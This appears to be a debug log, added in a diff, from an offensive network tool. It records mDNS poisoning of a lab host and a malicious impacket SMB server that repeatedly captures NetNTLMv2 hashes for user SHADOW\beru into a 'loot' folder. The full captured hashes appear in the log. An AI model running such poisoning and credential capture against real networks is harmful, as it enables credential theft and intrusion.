+2022-03-02 19:45:26.209 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:45:26.211 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:45:26.212 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:115 - [36m(MDNS) Sending packet to fe80::f1f5:96d5:abd5:67a0[0m
+2022-03-02 19:45:26.276 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:45:26.278 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:45:26.283 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:45:26.284 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:45:27.156 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:45:27.158 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:45:27.164 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:45:27.166 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:45:30.242 | DEBUG    | project.network.mitm.mss:do_mss:203 - Starting malicious smb server attack using ip: 192.168.253.135 
+            interface: ens33 mac_address:00:0c:29:0e:d7:3b lport:445
+2022-03-02 19:45:30.244 | DEBUG    | project.shell.igris:check_settable_variables_value:250 - Checking the correct value of the necessary settable variables 
+2022-03-02 19:45:30.251 | INFO     | project.network.mitm.mss:__wrapper_attack:88 - Running mss the results will be saved in : loot/
+2022-03-02 19:45:30.251 | INFO     | project.network.mitm.mss:__wrapper_attack:88 - Running mss the results will be saved in : loot/
+2022-03-02 19:45:30.257 | INFO     | project.network.mitm.servers.smbserver:start_malicious_smbserver:66 - Starting Malicious SMB Server ...
+2022-03-02 19:45:30.257 | INFO     | project.network.mitm.servers.smbserver:start_malicious_smbserver:66 - Starting Malicious SMB Server ...
+2022-03-02 19:45:30.260 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
+2022-03-02 19:45:30.260 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
+2022-03-02 19:45:30.261 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+2022-03-02 19:45:30.261 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+2022-03-02 19:45:30.261 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+2022-03-02 19:45:30.261 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+2022-03-02 19:45:37.563 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:45:37.564 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:45:37.565 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:115 - [36m(MDNS) Sending packet to 192.168.253.138[0m
+2022-03-02 19:45:37.616 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:45:37.617 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:45:37.618 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:115 - [36m(MDNS) Sending packet to fe80::f1f5:96d5:abd5:67a0[0m
+2022-03-02 19:45:49.040 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:45:49.040 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:45:49.040 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:115 - [36m(MDNS) Sending packet to 192.168.253.138[0m
+2022-03-02 19:45:49.076 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:45:49.077 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:45:49.078 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:115 - [36m(MDNS) Sending packet to fe80::f1f5:96d5:abd5:67a0[0m
+2022-03-02 19:45:49.120 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:45:49.121 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:45:49.122 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:45:49.122 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:45:50.131 | INFO     | impacket.smbserver:handle:3756 - Incoming connection (192.168.253.138,50451)
+2022-03-02 19:45:50.131 | INFO     | impacket.smbserver:handle:3756 - Incoming connection (192.168.253.138,50451)
+2022-03-02 19:45:50.351 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2461 - AUTHENTICATE_MESSAGE (SHADOW\beru,PC-BERU)
+2022-03-02 19:45:50.351 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2461 - AUTHENTICATE_MESSAGE (SHADOW\beru,PC-BERU)
+2022-03-02 19:45:50.356 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2494 - User PC-BERU\beru authenticated successfully
+2022-03-02 19:45:50.356 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2494 - User PC-BERU\beru authenticated successfully
+2022-03-02 19:45:50.507 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2506 - beru::SHADOW:aaaaaaaaaaaaaaaa:18b80c74b40490a1df9b13b582a31bbf:010100000000000000ab791e6e2ed80113e794ea9eb2ad4e00000000010010004700730057005100750042007400640003001000470073005700510075004200740064000200100075004c007500560063004b00450066000400100075004c007500560063004b00450066000700080000ab791e6e2ed80106000400020000000800300030000000000000000100000000200000f393ee15b5fb21bad67a70a7c20b32c4aa011ca5e11936421d9d399c6c8c20150a001000000000000000000000000000000000000900280063006900660073002f007000720075006500620061006100610061002e006c006f00630061006c000000000000000000
+2022-03-02 19:45:50.507 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2506 - beru::SHADOW:aaaaaaaaaaaaaaaa:18b80c74b40490a1df9b13b582a31bbf:010100000000000000ab791e6e2ed80113e794ea9eb2ad4e00000000010010004700730057005100750042007400640003001000470073005700510075004200740064000200100075004c007500560063004b00450066000400100075004c007500560063004b00450066000700080000ab791e6e2ed80106000400020000000800300030000000000000000100000000200000f393ee15b5fb21bad67a70a7c20b32c4aa011ca5e11936421d9d399c6c8c20150a001000000000000000000000000000000000000900280063006900660073002f007000720075006500620061006100610061002e006c006f00630061006c000000000000000000
+2022-03-02 19:45:50.599 | INFO     | impacket.smbserver:NetrShareEnum:4641 - NetrShareEnum Level: 1
+2022-03-02 19:45:50.599 | INFO     | impacket.smbserver:NetrShareEnum:4641 - NetrShareEnum Level: 1
+2022-03-02 19:45:53.542 | WARNING  | project.network.mitm.mss:__synchronous_attack:76 - Exiting attack ...
+2022-03-02 19:45:53.542 | WARNING  | project.network.mitm.mss:__synchronous_attack:76 - Exiting attack ...
+2022-03-02 19:46:08.181 | DEBUG    | project.network.mitm.mss:do_mss:203 - Starting malicious smb server attack using ip: 192.168.253.135 
+            interface: ens33 mac_address:00:0c:29:0e:d7:3b lport:445
+2022-03-02 19:46:08.182 | DEBUG    | project.shell.igris:check_settable_variables_value:250 - Checking the correct value of the necessary settable variables 
+2022-03-02 19:46:08.188 | INFO     | project.network.mitm.mss:__wrapper_attack:88 - Running mss the results will be saved in : loot/
+2022-03-02 19:46:08.188 | INFO     | project.network.mitm.mss:__wrapper_attack:88 - Running mss the results will be saved in : loot/
+2022-03-02 19:46:08.197 | INFO     | project.network.mitm.servers.smbserver:start_malicious_smbserver:66 - Starting Malicious SMB Server ...
+2022-03-02 19:46:08.197 | INFO     | project.network.mitm.servers.smbserver:start_malicious_smbserver:66 - Starting Malicious SMB Server ...
+2022-03-02 19:46:08.200 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
+2022-03-02 19:46:08.200 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
+2022-03-02 19:46:08.201 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+2022-03-02 19:46:08.201 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+2022-03-02 19:46:08.202 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+2022-03-02 19:46:08.202 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+2022-03-02 19:46:19.109 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:46:19.110 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:46:19.111 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:115 - [36m(MDNS) Sending packet to 192.168.253.138[0m
+2022-03-02 19:46:19.160 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:46:19.161 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:46:19.162 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:115 - [36m(MDNS) Sending packet to fe80::f1f5:96d5:abd5:67a0[0m
+2022-03-02 19:46:19.207 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:46:19.208 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:46:19.211 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:46:19.212 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:46:19.936 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:46:19.938 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:46:19.944 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:46:19.945 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:46:19.950 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:46:19.951 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:46:19.956 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:46:19.957 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:46:20.122 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:46:20.124 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:46:20.126 | INFO     | impacket.smbserver:handle:3756 - Incoming connection (192.168.253.138,50453)
+2022-03-02 19:46:20.126 | INFO     | impacket.smbserver:handle:3756 - Incoming connection (192.168.253.138,50453)
+2022-03-02 19:46:20.130 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:46:20.132 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:46:20.153 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2461 - AUTHENTICATE_MESSAGE (SHADOW\beru,PC-BERU)
+2022-03-02 19:46:20.153 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2461 - AUTHENTICATE_MESSAGE (SHADOW\beru,PC-BERU)
+2022-03-02 19:46:20.154 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2494 - User PC-BERU\beru authenticated successfully
+2022-03-02 19:46:20.154 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2494 - User PC-BERU\beru authenticated successfully
+2022-03-02 19:46:20.162 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2506 - beru::SHADOW:aaaaaaaaaaaaaaaa:b35f89c71f4302ad0570546078d56fce:0101000000000000004e5b306e2ed8014051e78aab00476e00000000010010007300770046004d004d00630051005300030010007300770046004d004d00630051005300020010004c007600730051004700790073004700040010004c00760073005100470079007300470007000800004e5b306e2ed80106000400020000000800300030000000000000000100000000200000f393ee15b5fb21bad67a70a7c20b32c4aa011ca5e11936421d9d399c6c8c20150a001000000000000000000000000000000000000900280063006900660073002f007000720075006500620061006100610061002e006c006f00630061006c000000000000000000
+2022-03-02 19:46:20.162 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2506 - beru::SHADOW:aaaaaaaaaaaaaaaa:b35f89c71f4302ad0570546078d56fce:0101000000000000004e5b306e2ed8014051e78aab00476e00000000010010007300770046004d004d00630051005300030010007300770046004d004d00630051005300020010004c007600730051004700790073004700040010004c00760073005100470079007300470007000800004e5b306e2ed80106000400020000000800300030000000000000000100000000200000f393ee15b5fb21bad67a70a7c20b32c4aa011ca5e11936421d9d399c6c8c20150a001000000000000000000000000000000000000900280063006900660073002f007000720075006500620061006100610061002e006c006f00630061006c000000000000000000
+2022-03-02 19:46:20.182 | INFO     | impacket.smbserver:NetrShareEnum:4641 - NetrShareEnum Level: 1
+2022-03-02 19:46:20.182 | INFO     | impacket.smbserver:NetrShareEnum:4641 - NetrShareEnum Level: 1
+2022-03-02 19:46:20.934 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:46:20.936 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:46:20.940 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:46:20.942 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:46:20.947 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:46:20.948 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:46:20.953 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:46:20.954 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:46:22.085 | WARNING  | project.network.mitm.mss:__synchronous_attack:76 - Exiting attack ...
+2022-03-02 19:46:22.085 | WARNING  | project.network.mitm.mss:__synchronous_attack:76 - Exiting attack ...
+2022-03-02 19:47:22.778 | DEBUG    | project.utils.neo.dboperations:__init__:30 - The neo4j dirver has been created successfully
+2022-03-02 19:47:30.088 | DEBUG    | project.network.poison.poisonselector:do_poison:202 - Starting poison attack using lhost: 192.168.253.135 rhost:192.168.253.138 ipv6:fe80::20c:29ff:fe0e:d73b
+            interface: ens33 mac_address:00:0c:29:0e:d7:3b
+2022-03-02 19:47:30.089 | DEBUG    | project.shell.igris:check_settable_variables_value:250 - Checking the correct value of the necessary settable variables 
+2022-03-02 19:47:30.104 | INFO     | project.network.poison.poisonengine.poisonlauncher:__create_mdns:77 - Running mdns poisoning in the background
+2022-03-02 19:47:30.104 | INFO     | project.network.poison.poisonengine.poisonlauncher:__create_mdns:77 - Running mdns poisoning in the background
+2022-03-02 19:47:30.106 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:start_mdns_poisoning:155 - Starting mdns poisoning...
+2022-03-02 19:47:32.310 | DEBUG    | project.network.mitm.mss:do_mss:203 - Starting malicious smb server attack using ip: 192.168.253.135 
+            interface: ens33 mac_address:00:0c:29:0e:d7:3b lport:445
+2022-03-02 19:47:32.311 | DEBUG    | project.shell.igris:check_settable_variables_value:250 - Checking the correct value of the necessary settable variables 
+2022-03-02 19:47:32.321 | INFO     | project.network.mitm.mss:__wrapper_attack:88 - Running mss the results will be saved in : loot/
+2022-03-02 19:47:32.321 | INFO     | project.network.mitm.mss:__wrapper_attack:88 - Running mss the results will be saved in : loot/
+2022-03-02 19:47:32.330 | INFO     | project.network.mitm.servers.smbserver:start_malicious_smbserver:66 - Starting Malicious SMB Server ...
+2022-03-02 19:47:32.330 | INFO     | project.network.mitm.servers.smbserver:start_malicious_smbserver:66 - Starting Malicious SMB Server ...
+2022-03-02 19:47:32.333 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
+2022-03-02 19:47:32.333 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
+2022-03-02 19:47:32.334 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+2022-03-02 19:47:32.334 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+2022-03-02 19:47:32.335 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+2022-03-02 19:47:32.335 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+2022-03-02 19:47:43.592 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:47:43.593 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:47:43.593 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:115 - [36m(MDNS) Sending packet to 192.168.253.138[0m
+2022-03-02 19:47:43.639 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:47:43.639 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:47:43.640 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:115 - [36m(MDNS) Sending packet to fe80::f1f5:96d5:abd5:67a0[0m
+2022-03-02 19:47:43.694 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:47:43.695 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:47:43.698 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:47:43.699 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:47:44.584 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:47:44.585 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:47:44.588 | INFO     | impacket.smbserver:handle:3756 - Incoming connection (192.168.253.138,50456)
+2022-03-02 19:47:44.588 | INFO     | impacket.smbserver:handle:3756 - Incoming connection (192.168.253.138,50456)
+2022-03-02 19:47:44.589 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:47:44.589 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:47:44.613 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2461 - AUTHENTICATE_MESSAGE (SHADOW\beru,PC-BERU)
+2022-03-02 19:47:44.613 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2461 - AUTHENTICATE_MESSAGE (SHADOW\beru,PC-BERU)
+2022-03-02 19:47:44.620 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2494 - User PC-BERU\beru authenticated successfully
+2022-03-02 19:47:44.620 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2494 - User PC-BERU\beru authenticated successfully
+2022-03-02 19:47:44.625 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2506 - beru::SHADOW:aaaaaaaaaaaaaaaa:76e71acbca10db38b4b15a98cad7f51f:010100000000000000b06c626e2ed801803f55875a8267620000000001001000560072006b004f004e0073005a00770003001000560072006b004f004e0073005a007700020010007000500051006e00480073007a004300040010007000500051006e00480073007a0043000700080000b06c626e2ed80106000400020000000800300030000000000000000100000000200000f393ee15b5fb21bad67a70a7c20b32c4aa011ca5e11936421d9d399c6c8c20150a001000000000000000000000000000000000000900280063006900660073002f007000720075006500620061006100610061002e006c006f00630061006c000000000000000000
+2022-03-02 19:47:44.625 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2506 - beru::SHADOW:aaaaaaaaaaaaaaaa:76e71acbca10db38b4b15a98cad7f51f:010100000000000000b06c626e2ed801803f55875a8267620000000001001000560072006b004f004e0073005a00770003001000560072006b004f004e0073005a007700020010007000500051006e00480073007a004300040010007000500051006e00480073007a0043000700080000b06c626e2ed80106000400020000000800300030000000000000000100000000200000f393ee15b5fb21bad67a70a7c20b32c4aa011ca5e11936421d9d399c6c8c20150a001000000000000000000000000000000000000900280063006900660073002f007000720075006500620061006100610061002e006c006f00630061006c000000000000000000
+2022-03-02 19:47:44.646 | INFO     | impacket.smbserver:NetrShareEnum:4641 - NetrShareEnum Level: 1
+2022-03-02 19:47:44.646 | INFO     | impacket.smbserver:NetrShareEnum:4641 - NetrShareEnum Level: 1
+2022-03-02 19:47:44.949 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:47:44.950 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:47:44.955 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:47:44.956 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:47:44.960 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:47:44.961 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:47:44.966 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:47:44.967 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:47:45.946 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:47:45.947 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:47:45.951 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:47:45.952 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:47:47.634 | WARNING  | project.network.mitm.mss:__synchronous_attack:76 - Exiting attack ...
+2022-03-02 19:47:47.634 | WARNING  | project.network.mitm.mss:__synchronous_attack:76 - Exiting attack ...
+2022-03-02 19:48:01.977 | DEBUG    | project.network.mitm.mss:do_mss:203 - Starting malicious smb server attack using ip: 192.168.253.135 
+            interface: ens33 mac_address:00:0c:29:0e:d7:3b lport:445
+2022-03-02 19:48:01.978 | DEBUG    | project.shell.igris:check_settable_variables_value:250 - Checking the correct value of the necessary settable variables 
+2022-03-02 19:48:02.074 | INFO     | project.network.mitm.mss:__wrapper_attack:88 - Running mss the results will be saved in : loot/
+2022-03-02 19:48:02.074 | INFO     | project.network.mitm.mss:__wrapper_attack:88 - Running mss the results will be saved in : loot/
+2022-03-02 19:48:02.267 | INFO     | project.network.mitm.servers.smbserver:start_malicious_smbserver:66 - Starting Malicious SMB Server ...
+2022-03-02 19:48:02.267 | INFO     | project.network.mitm.servers.smbserver:start_malicious_smbserver:66 - Starting Malicious SMB Server ...
+2022-03-02 19:48:02.393 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
+2022-03-02 19:48:02.393 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
+2022-03-02 19:48:02.396 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+2022-03-02 19:48:02.396 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+2022-03-02 19:48:02.405 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+2022-03-02 19:48:02.405 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+2022-03-02 19:48:20.239 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:48:20.240 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:48:20.240 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:115 - [36m(MDNS) Sending packet to 192.168.253.138[0m
+2022-03-02 19:48:20.277 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:48:20.277 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:48:20.278 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:115 - [36m(MDNS) Sending packet to fe80::f1f5:96d5:abd5:67a0[0m
+2022-03-02 19:48:20.326 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:48:20.326 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:48:20.329 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:48:20.330 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:48:21.241 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
